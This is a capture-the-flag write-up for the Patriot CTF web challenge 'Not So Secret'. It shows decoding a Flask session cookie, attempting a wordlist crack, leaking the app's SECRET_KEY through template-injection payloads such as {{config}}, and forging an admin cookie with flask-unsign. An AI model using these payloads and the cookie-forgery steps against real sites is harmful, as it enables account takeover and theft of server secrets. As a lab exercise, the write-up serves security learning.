# Patriot CTF

## Web

### Not So Secret

**Difficulty:** Medium

**Statement:** I am creating the next big social networking platform, but I have a history of setting up unsecured software.

If you can log in to the admin user, I will give you the flag.

Someone hacked my site after I read his message, so I don't read the DMs sent to me anymore! > :( 

On top of that, I'm imposing an even stricter special character filter because I don't really know how to patch my code.

p.s. To save you time, don't try to get a reverse shell

***

When logging into the site, you can see that the session cookie is a Flask cookie:

```
.eJwlzjEOwjAMBdC7eGaI7X4n6WVQnNiCtaUT4u4g8U7w3nTPI84H7a_jihvdn4t2mqEo3vsaYEHFcuUsHdgcm3plzEB6baHSCrqYhLFnaI7KGsk8UYRzYlpzF-TiluI2TIaoDNWiLS2kcYZV3mou6CpjlCaVfpHrjOO_Ufp8AYinLpY. YmzqWA.f1mFmMrseT1CpljXeYZAInT8c_Q
```

I start by decoding the cookie with **flask-unsign** :

```
flask-unsign --decode --cookie 'eJwlzjEOwjAMBdC7eGaI7X4n6WVQnNiCtaUT4u4g8U7w3nTPI84H7a_jihvdn4t2mqEo3vsaYEHFcuUsHdgcm3plzEB6baHSCrqYhLFnaI7KGsk8UYRzYlpzF- TiluI2TIaoDNWiLS2kcYZV3mou6CpjlCaVfpHrjOO_Ufp8AYinLpY. YmzqWA.f1mFmMrseT1CpljXeYZAInT8c_Q'
```

Cookie value:

```py
{'_fresh': True, '_id': 'ce350b99da512575db31f09554b543b715ce5fb78e328059262e61bfe3fa713ef11c5021fc5c68bb25fd18f2b6a62a232a33038f6e281fe67147fd53d0aa0827', '_user_id': '2'}
```

We can see that the value `'_user_id'` is 2.
It is very likely that the value 1 is the administrator account.

I then try to brute force the cookie by dictionary attack but not conclusively:

```
flask-unsign --unsign --cookie ". eJwlzjEOwjAMBdC7eGaI7X4n6WVQnNiCtaUT4u4g8U7w3nTPI84H7a_jihvdn4t2mqEo3vsaYEHFcuUsHdgcm3plzEB6baHSCrqYhLFnaI7KGsk8UYRzYlpzF-TiluI2TIaoDNWiLS2kcYZV3mou6CpjlCaVfpHrjOO_Ufp8AYinLpY. YmzqWA.f1mFmMrseT1CpljXeYZAInT8c_Q" --wordlist ~/rockyou.txt --no-lit
eral-eval
```

We are missing the key to sign our Flask cookie, so I decide to look at the web server side to get this value.

On the message sending page, I notice that a SSTI (Server Side Template Injection) flaw is exploitable thanks to a simple payload: `{{7*'7'}}`

![image](https://user-images.githubusercontent.com/49941629/166097821-b3fa5a63-abac-40f1-bfe5-00b2e5cae5ab.png)

So I'll try to recover the server configuration by injecting the payload `{{config}}` :

```
Just sent your message: <Config {'ENV': 'production',
DEBUG': False,
'TESTING': False,
PROPAGATE_EXCEPTIONS': None, 
PRESERVE_CONTEXT_ON_EXCEPTION': None, 
SECRET_KEY': 'qHIMoRzDyjmWXmtOVYXRUomyOiBaNd', 
'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 
USE_X_SENDFILE': False, 
'SERVER_NAME': None, 
'APPLICATION_ROOT': '/', 
'SESSION_COOKIE_NAME': 'session', 
'SESSION_COOKIE_DOMAIN': False,
'SESSION_COOKIE_PATH': None, 
'SESSION_COOKIE_HTTPONLY': False, 
'SESSION_COOKIE_SECURE': False, 
'SESSION_COOKIE_SAMESITE': None, 
'SESSION_REFRESH_EACH_REQUEST': True, 
'MAX_CONTENT_LENGTH': None, 
'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 
TRAP_BAD_REQUEST_ERRORS': None, 
TRAP_HTTP_EXCEPTIONS': False, 
EXPLAIN_TEMPLATE_LOADING': False, 
'PREFERRED_URL_SCHEME': 'http', 
'JSON_AS_ASCII': True, 
'JSON_SORT_KEYS': True, 
'JSONIFY_PRETTYPRINT_REGULAR': False, 
'JSONIFY_MIMETYPE': 'application/json', 
'TEMPLATES_AUTO_RELOAD': None, 
'MAX_COOKIE_SIZE': 4093, 
'SQLALCHEMY_DATABASE_URI': 'sqlite:///db.sqlite', 
'SQLALCHEMY_TRACK_MODIFICATIONS': False, 
'UPLOAD_FOLDER': '/app/app/uploads', 
'SQLALCHEMY_BINDS': None, 
'SQLALCHEMY_NATIVE_UNICODE': None, 
'SQLALCHEMY_ECHO': False, 
'SQLALCHEMY_RECORD_QUERIES': None, 
'SQLALCHEMY_POOL_SIZE': None,
'SQLALCHEMY_POOL_TIMEOUT': None, 
'SQLALCHEMY_POOL_RECYCLE': None, 
'SQLALCHEMY_MAX_OVERFLOW': None, 
'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 
'SQLALCHEMY_ENGINE_OPTIONS': {}}>
```

I get the value of the key: `'SECRET_KEY': 'qHIMoRzDyjmWXmtOVYXRUomyOiBaNd'` and change the cookie to match the admin account :

```
flask-unsign --sign --cookie "{'_fresh': True, '_id': 'ce350b99da512575db31f09554b543b715ce5fb78e328059262e61bfe3fa713ef11c5021fc5c68bb25fd18f2b6a62a232a33038f6e281fe67147fd53d0aa0827', '_user_id': '1'}" --secret 'qHIMoRzDyjmWXmtOVYXRUomyOiBaNd'
```

![image](https://user-images.githubusercontent.com/49941629/166097953-0f4dcb33-87fe-4fc6-bf3f-efcbc8217dd3.png)

Now I just have to authenticate with the admin cookie and get the flag.

Flag: PCTF{y0u_can_s1gn_my_c00k13s_anyt1m3_;)}

